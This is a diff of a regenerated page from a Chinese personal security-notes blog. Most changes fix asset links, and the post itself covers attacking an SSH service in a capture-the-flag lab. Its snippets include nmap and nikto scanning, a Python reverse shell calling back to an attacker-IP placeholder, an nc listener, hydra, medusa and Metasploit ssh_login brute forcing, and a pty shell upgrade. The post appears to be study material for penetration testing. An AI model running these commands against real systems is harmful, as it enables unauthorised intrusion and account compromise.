@@ -40,7 +40,7 @@
 
   
   
-  <link href="../../../../lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -48,24 +48,24 @@
 
 
 
-<link href="../../../../lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="../../../../css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon-next.png?v=5.1.4">
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
-  <link rel="icon" type="image/png" sizes="32x32" href="../../../../images/favicon-32x32-next.png?v=5.1.4">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
 
 
-  <link rel="icon" type="image/png" sizes="16x16" href="../../../../images/favicon-16x16-next.png?v=5.1.4">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
 
 
-  <link rel="mask-icon" href="../../../../images/logo.svg?v=5.1.4" color="#222">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
 
 
-  <link rel="manifest" href="../../../../images/manifest.json">
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
 
 
 
@@ -89,7 +89,7 @@
 <meta property="og:site_name" content="各种笔记">
 <meta property="og:description" content="ssh服务协议弱点基于口令用字典宝暴力破解 基于秘钥12chmod 600 id_rsassh -i id_rsa user@host 信息探测开放服务1nmap -sV ip 全部信息1nmap -A -v ip 操作系统1nmap -O ip 挖掘敏感信息1nikto -host ip 扩大战果 查看当前用户 whoami ID查看用户权限 查看根目录 寻找flag  查看配置信息1234ca">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-27T12:50:16.784Z">
+<meta property="og:updated_time" content="2019-08-30T10:54:58.075Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ssh服务">
 <meta name="twitter:description" content="ssh服务协议弱点基于口令用字典宝暴力破解 基于秘钥12chmod 600 id_rsassh -i id_rsa user@host 信息探测开放服务1nmap -sV ip 全部信息1nmap -A -v ip 操作系统1nmap -O ip 挖掘敏感信息1nikto -host ip 扩大战果 查看当前用户 whoami ID查看用户权限 查看根目录 寻找flag  查看配置信息1234ca">
@@ -184,7 +184,7 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="" rel="section">
+          <a href="/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -194,7 +194,7 @@
       
         
         <li class="menu-item menu-item-about">
-          <a href="" rel="section">
+          <a href="/about" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -204,7 +204,7 @@
       
         
         <li class="menu-item menu-item-tags">
-          <a href="" rel="section">
+          <a href="/tags" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -214,7 +214,7 @@
       
         
         <li class="menu-item menu-item-categories">
-          <a href="" rel="section">
+          <a href="/categories" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -224,7 +224,7 @@
       
         
         <li class="menu-item menu-item-archives">
-          <a href="" rel="section">
+          <a href="/archives" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
@@ -265,12 +265,12 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/24/ssh服务/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="newird">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="../../../../images/head.jpg">
+      <meta itemprop="image" content="/images/head.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -317,7 +317,7 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="../../../../categories/安全/" itemprop="url" rel="index">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
                     <span itemprop="name">安全</span>
                   </a>
                 </span>
@@ -369,9 +369,13 @@
 <h3 id="深入挖掘"><a href="#深入挖掘" class="headerlink" title="深入挖掘"></a>深入挖掘</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/etc/</span>crontab</span><br></pre></td></tr></table></figure>
 <p>用户任务编辑,定时执行</p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/user/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"攻击机ip"</span>,port))</span><br><span class="line"><span class="comment">//返回输出信息</span></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>
-<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight nc"><figcaption><span>-lpv ```未占用端口</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查看占用端口 ```netstat -pantu``</span><br><span class="line"></span><br><span class="line"><span class="attr">### 暴力破解</span></span><br><span class="line"><span class="attr"></span></span><br><span class="line"><span class="attr">hydra , medusa</span></span><br><span class="line"><span class="attr"></span></span><br><span class="line"><span class="attr">字典</span></span><br><span class="line"><span class="attr"></span></span><br><span class="line"><span class="attr">```</span></span><br></pre></td></tr></table></figure>
-<p>git clone <a href="https://github.com/jeanphorn/common-passwod.git" target="_blank" rel="noopener">https://github.com/jeanphorn/common-passwod.git</a></p>
-<p>./cupp.py -i<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">已交互方式创建字典</span><br><span class="line"></span><br><span class="line"><span class="comment">### metasploit</span></span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">``````shell</span><br><span class="line">msf&gt;use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(ssh_login) &gt; shoe options</span><br><span class="line">msf auxiliary(ssh_login) &gt; <span class="builtin-name">set</span> rhost ip</span><br><span class="line">msf auxiliary(ssh_login) &gt; <span class="builtin-name">set</span> username name</span><br><span class="line">msf auxiliary(ssh_login) &gt; <span class="builtin-name">set</span> pass_file name.txt</span><br><span class="line">msf auxiliary(ssh_login) &gt; <span class="builtin-name">set</span> threads 5</span><br><span class="line">msf auxiliary(ssh_login) &gt; run</span><br><span class="line">session -i 1</span><br></pre></td></tr></table></figure></p>
+<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lpv #未占用端口</span><br><span class="line">netstat #-pantu查看占用端口</span><br></pre></td></tr></table></figure>
+<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>hydra , medusa</p>
+<p>字典</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/jeanphorn/common-passwod.git</span><br><span class="line"></span><br><span class="line">./cupp.py -i</span><br></pre></td></tr></table></figure>
+<p>已交互方式创建字典</p>
+<h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><p>msfconsole</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">msf&gt;</span><span class="bash">use auxiliary/scanner/ssh/ssh_login</span></span><br><span class="line">msf auxiliary(ssh_login) &gt; shoe options</span><br><span class="line">msf auxiliary(ssh_login) &gt; set rhost ip</span><br><span class="line">msf auxiliary(ssh_login) &gt; set username name</span><br><span class="line">msf auxiliary(ssh_login) &gt; set pass_file name.txt</span><br><span class="line">msf auxiliary(ssh_login) &gt; set threads 5</span><br><span class="line">msf auxiliary(ssh_login) &gt; run</span><br><span class="line">session -i 1</span><br></pre></td></tr></table></figure>
 <p>优化会话</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">su -root</span><br></pre></td></tr></table></figure>
 <h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p><code>cat flag.txt</code></p>
@@ -392,7 +396,7 @@
       
         <div class="post-tags">
           
-            <a href="../../../../tags/ssh/" rel="tag"># ssh</a>
+            <a href="/tags/ssh/" rel="tag"># ssh</a>
           
         </div>
       
@@ -405,8 +409,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="../../../../2018/09/22/序/" rel="next" title="序">
-                <i class="fa fa-chevron-left"></i> 序
+              <a href="/2018/09/22/nc/" rel="next" title="kali基础之nc">
+                <i class="fa fa-chevron-left"></i> kali基础之nc
               </a>
             
           </div>
@@ -415,7 +419,7 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="../Smb (server message block)信息泄露/" rel="prev" title="smb服务">
+              <a href="/2019/08/24/Smb (server message block)信息泄露/" rel="prev" title="smb服务">
                 smb服务 <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -484,7 +488,7 @@
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
               <img class="site-author-image" itemprop="image"
-                src="../../../../images/head.jpg"
+                src="/images/head.jpg"
                 alt="newird" />
             
               <p class="site-author-name" itemprop="name">newird</p>
@@ -496,7 +500,7 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="../../../../archives">
+                <a href="/archives">
               
                   <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">日志</span>
@@ -508,7 +512,7 @@
               
               
               <div class="site-state-item site-state-categories">
-                <a href="../../../../categories/index.html">
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
@@ -519,7 +523,7 @@
               
               
               <div class="site-state-item site-state-tags">
-                <a href="../../../../tags/index.html">
+                <a href="/tags/index.html">
                   <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
@@ -589,7 +593,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ssh服务"><span class="nav-number">1.</span> <span class="nav-text">ssh服务</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#协议弱点"><span class="nav-number">1.1.</span> <span class="nav-text">协议弱点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于口令"><span class="nav-number">1.1.1.</span> <span class="nav-text">基于口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于秘钥"><span class="nav-number">1.1.2.</span> <span class="nav-text">基于秘钥</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息探测"><span class="nav-number">1.2.</span> <span class="nav-text">信息探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#开放服务"><span class="nav-number">1.2.1.</span> <span class="nav-text">开放服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#全部信息"><span class="nav-number">1.2.2.</span> <span class="nav-text">全部信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#操作系统"><span class="nav-number">1.2.3.</span> <span class="nav-text">操作系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#挖掘敏感信息"><span class="nav-number">1.2.4.</span> <span class="nav-text">挖掘敏感信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#扩大战果"><span class="nav-number">1.3.</span> <span class="nav-text">扩大战果</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看配置信息"><span class="nav-number">1.3.1.</span> <span class="nav-text">查看配置信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#深入挖掘"><span class="nav-number">1.3.2.</span> <span class="nav-text">深入挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell"><span class="nav-number">1.3.3.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc"><span class="nav-number">1.3.4.</span> <span class="nav-text">nc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取flag"><span class="nav-number">1.4.</span> <span class="nav-text">获取flag</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ssh服务"><span class="nav-number">1.</span> <span class="nav-text">ssh服务</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#协议弱点"><span class="nav-number">1.1.</span> <span class="nav-text">协议弱点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于口令"><span class="nav-number">1.1.1.</span> <span class="nav-text">基于口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于秘钥"><span class="nav-number">1.1.2.</span> <span class="nav-text">基于秘钥</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息探测"><span class="nav-number">1.2.</span> <span class="nav-text">信息探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#开放服务"><span class="nav-number">1.2.1.</span> <span class="nav-text">开放服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#全部信息"><span class="nav-number">1.2.2.</span> <span class="nav-text">全部信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#操作系统"><span class="nav-number">1.2.3.</span> <span class="nav-text">操作系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#挖掘敏感信息"><span class="nav-number">1.2.4.</span> <span class="nav-text">挖掘敏感信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#扩大战果"><span class="nav-number">1.3.</span> <span class="nav-text">扩大战果</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看配置信息"><span class="nav-number">1.3.1.</span> <span class="nav-text">查看配置信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#深入挖掘"><span class="nav-number">1.3.2.</span> <span class="nav-text">深入挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell"><span class="nav-number">1.3.3.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc"><span class="nav-number">1.3.4.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#暴力破解"><span class="nav-number">1.3.5.</span> <span class="nav-text">暴力破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#metasploit"><span class="nav-number">1.3.6.</span> <span class="nav-text">metasploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取flag"><span class="nav-number">1.4.</span> <span class="nav-text">获取flag</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -686,64 +690,64 @@
 
   
   
-    <script type="text/javascript" src="../../../../lib/jquery/index.js?v=2.1.3"></script>
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
   
 
   
   
-    <script type="text/javascript" src="../../../../lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
   
 
   
   
-    <script type="text/javascript" src="../../../../lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
   
 
   
   
-    <script type="text/javascript" src="../../../../lib/velocity/velocity.min.js?v=1.2.1"></script>
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
   
 
   
   
-    <script type="text/javascript" src="../../../../lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
   
 
   
   
-    <script type="text/javascript" src="../../../../lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
   
-
-
-  
-
-
-  <script type="text/javascript" src="../../../../js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="../../../../js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="../../../../js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="../../../../js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="../../../../js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="../../../../js/src/post-details.js?v=5.1.4"></script>
-
 
 
   
 
 
-  <script type="text/javascript" src="../../../../js/src/bootstrap.js?v=5.1.4"></script>
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
 
 
 
